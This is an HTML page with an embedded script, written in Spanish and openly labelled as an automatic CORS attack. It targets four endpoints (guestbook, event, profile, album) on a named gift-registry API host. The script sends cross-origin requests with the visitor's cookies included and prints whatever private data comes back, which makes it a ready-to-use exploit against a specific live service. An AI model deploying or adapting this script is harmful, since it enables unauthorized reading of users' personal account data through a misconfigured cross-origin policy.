<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Ejecutando CORS Attack</title>
  <style>
    body { font-family: monospace; background: #f4f4f4; padding: 20px; }
    .success { color: green; }
    .error { color: red; }
  </style>
</head>
<body>
  <h2>üî• Ataque CORS autom√°tico en curso...</h2>
  <div id="resultado"></div>

  <script>
    const endpoints = [
      "/Guestbook",
      "/Event",
      "/Profile",
      "/Album"
    ];

    const output = document.getElementById("resultado");

    endpoints.forEach(endpoint => {
      fetch("https://api.mesaderegalos.liverpool.mx" + endpoint, {
        method: "GET",
        mode: "cors",
        credentials: "include", // intenta usar cookies si existen
        headers: {
          // opcional: si el token es inyectado por la app, no pongas nada
          // "Authorization": "Bearer [si el token es global y accesible]"
          "Accept": "application/json"
        }
      })
      .then(res => res.text())
      .then(data => {
        const pre = document.createElement("pre");
        pre.className = "success";
        pre.textContent = `[‚úÖ ${endpoint}]\n` + data;
        output.appendChild(pre);
      })
      .catch(err => {
        const pre = document.createElement("pre");
        pre.className = "error";
        pre.textContent = `[‚ùå ${endpoint}]\nError: ` + err;
        output.appendChild(pre);
      });
    });
  </script>
</body>
</html>
